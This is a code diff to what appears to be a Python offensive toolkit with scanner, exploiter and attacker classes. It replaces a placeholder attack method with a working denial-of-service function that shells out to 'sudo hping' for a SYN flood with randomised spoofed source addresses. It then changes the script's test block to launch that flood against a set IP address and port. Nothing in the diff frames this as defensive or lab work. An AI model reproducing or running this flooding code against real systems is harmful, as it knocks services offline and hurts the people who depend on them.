@@ -266,9 +266,12 @@ class Attacker:
     def __init__(self):
         pass
     
-    def perform_attack(self, target_ip):
-        # Placeholder for attack logic
-        return f"Performing attack on {target_ip}"
+    def ddos(self, target_ip, target_port):
+        result = subprocess.run(["sudo", "hping", "-S", "-p", str(target_port), "--flood", "--rand-source", target_ip], capture_output=True, text=True)
+        if result.stdout:
+            return result.stdout
+        else:
+            return result.stderr
     
 if __name__ == "__main__":
     load_dotenv()
@@ -295,6 +298,8 @@ if __name__ == "__main__":
     # exploiter = Exploiter(msf_client)
     
     # Test
-    scanner = Scanner()
-    print(scanner.scan_entire_network())
+    # scanner = Scanner()
+    # print(scanner.scan_entire_network())
     #print(exploiter.find_vulnerabilities_for_service("vsftpd"))
+    attacker = Attacker()
+    print(attacker.ddos("192.168.100.102", "3000"))
